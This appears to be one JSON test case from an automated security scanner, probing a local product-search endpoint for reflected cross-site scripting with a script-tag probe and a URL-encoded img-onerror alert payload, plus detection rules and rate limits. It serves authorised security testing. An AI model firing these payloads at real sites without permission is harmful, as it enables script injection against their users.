    {
      "id": "tc-hv00-rest_products_search-xss",
      "hypothesis_id": "hv00-rest_products_search-xss",
      "base_url": "http://localhost:3000",
      "method": "GET",
      "endpoint": "/rest/products/search",
      "parameter": "q",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query",
              "value": ""
            }
          ],
          "description": "Baseline request with empty q",
          "content_type": "application/json"
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "<script>1</script>"
            }
          ],
          "description": "Probe for reflected script tag in response",
          "content_type": "application/json"
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query",
              "value": "%3Cimg%20src%3Dx%20onerror%3D%22alert(1)%22%3E"
            }
          ],
          "description": "Payload with encoded XSS vector",
          "encoding": "url",
          "content_type": "application/json"
        }
      ],
      "prerequisites": [],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "response.body contains payload_value or abs(len(response.body)-len(baseline.body))/max(1,len(baseline.body)) > 0.10",
          "threshold": {
            "body_length_delta_pct": 10.0,
            "expected_codes": [
              200
            ]
          },
          "weight": 1.0
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 50
      },
      "max_retries": 1,
      "delay_between_requests": 0.5,
      "notes": "Start with benign baseline. Respect rate limits. If responses are JSON, check for reflected strings in JSON values.",
      "tags": [
        "xss",
        "reflection"
      ],
      "estimated_duration": 60
    },
